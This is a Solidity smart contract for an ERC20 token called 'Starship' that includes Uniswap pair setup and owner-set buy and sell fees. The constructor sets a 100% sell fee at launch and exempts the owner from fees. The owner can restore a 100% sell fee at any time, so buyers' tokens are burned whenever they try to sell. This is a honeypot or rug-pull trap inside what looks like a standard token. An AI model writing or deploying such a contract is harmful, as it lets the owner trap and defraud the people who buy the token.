// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "./console.sol";

import "./ERC20.sol";
import "./Ownable.sol";
import "./SafeMath.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2 {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract Starship is ERC20, Ownable {
    using SafeMath for uint256;

    address public WETH;
    address public uniswapRouterV2;
    address public uniswapV2Pair;

    uint8 private _decimals = 18;
    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;

    mapping(address => bool) private _excludedFromFees;
    mapping(address => bool) private _swapPairs;
    uint256 public sellFee = 0; // Max 1000 = 100%
    uint256 public buyFee = 0; // Max 1000 = 100%

    constructor(string memory name_, string memory symbol_, uint256 supply_, address router_) ERC20(name_, symbol_) {
        uniswapRouterV2 = router_;
        WETH = IUniswapV2(uniswapRouterV2).WETH();

        _excludedFromFees[_msgSender()] = true;

        // Disable sell at launch time
        sellFee = 1000;

        _mint(_msgSender(), supply_ * 10 ** _decimals);
    }

    function generatePairWithETH() public onlyOwner {
        require(uniswapV2Pair == address(0), 'ETH pair exists');

        // Create dex pair with WETH
        address factoryAddress = IUniswapV2(uniswapRouterV2).factory();
        uniswapV2Pair = IUniswapV2Factory(factoryAddress).createPair(IUniswapV2(uniswapRouterV2).WETH(), address(this));
        _swapPairs[uniswapV2Pair] = true;
    }

    function setTaxFee(uint256 sellFee_, uint256 buyFee_) public onlyOwner {
        require(sellFee_ <= 1000 && buyFee_ <= 1000, 'invalid fee');
        sellFee = sellFee_;
        buyFee = buyFee_;
    }

    function addPair(address pairAddress) public onlyOwner {
        require(!_swapPairs[pairAddress], 'already added');
        _swapPairs[pairAddress] = true;
    }

    function deletePair(address pairAddress) public onlyOwner {
        require(_swapPairs[pairAddress], 'already deleted');
        _swapPairs[pairAddress] = false;
    }

    /**
     * @dev using to remove list accounts from tax fee
     * @param accounts list of address
     */
    function excludedFromFees(address[] memory accounts) public onlyOwner returns (bool) {
        for (uint256 i = 0; i < accounts.length; i++) {
            if (_excludedFromFees[accounts[i]] != true) {
                _excludedFromFees[accounts[i]] = true;
            }
        }
        return true;
    }

    /**
     * @dev using to apply tax fee for add list accounts
     * @param accounts list of address
     */
    function includedFees(address[] memory accounts) public onlyOwner returns (bool) {
        for (uint256 i = 0; i < accounts.length; i++) {
            if (_excludedFromFees[accounts[i]] != false) {
                _excludedFromFees[accounts[i]] = false;
            }
        }
        return true;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override {
        require(from != address(0), 'ERC20: transfer from the zero address');
        require(to != address(0), 'ERC20: transfer to the zero address');

        _beforeTokenTransfer(from, to, amount);

        require(_balances[from] >= amount, 'ERC20: transfer amount exceeds balance');
        uint256 feeAmount = _calculateFeeAmount(from, to, amount);

        unchecked {
            _balances[from] -= amount;
            _balances[to] += amount.sub(feeAmount);
        }

        emit Transfer(from, to, amount.sub(feeAmount));

        // Burn tax fee
        if (feeAmount > 0) {
            unchecked {
                _balances[address(0)] += feeAmount;
            }
            emit Transfer(from, address(0), feeAmount);
        }

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual override {
        require(account != address(0), 'ERC20: mint to the zero address');

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _calculateFeeAmount(address from, address to, uint256 amount) private view returns (uint256) {
        uint256 feeAmount = 0;
        (bool isAdd, bool isDel) = _isLiquidity(from, to);
        // Except fee from account whitelist or for add/ remove liquidity transaction
        if (_excludedFromFees[from] || isAdd || isDel) {
            return 0;
        }
        // Take sell fee
        if (_swapPairs[to] && sellFee > 0) {
            feeAmount = amount.div(1000).mul(sellFee);
        }
        // Take buy fee
        if (_swapPairs[from] && buyFee > 0) {
            feeAmount = amount.div(1000).mul(buyFee);
        }
        return feeAmount;
    }

    function _isLiquidity(address from, address to) internal view returns (bool isAdd, bool isDel) {
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        (uint r0, , ) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint bal0 = ERC20(token0).balanceOf(address(uniswapV2Pair));
        if (_swapPairs[to]) {
            if (token0 != address(this) && bal0 > r0) {
                isAdd = bal0 - r0 > 0;
            }
        }
        if (_swapPairs[from]) {
            if (token0 != address(this) && bal0 < r0) {
                isDel = r0 - bal0 > 0;
            }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual override {}

    /**
     * @dev For emergency withdraw token sent in wrong way
     * @param token token address
     */
    function emergencyWithdraw(address token) public onlyOwner {
        require(token != address(this), 'can not withdraw this token');
        ERC20(token).transfer(owner(), ERC20(token).balanceOf(address(this)));
    }
}

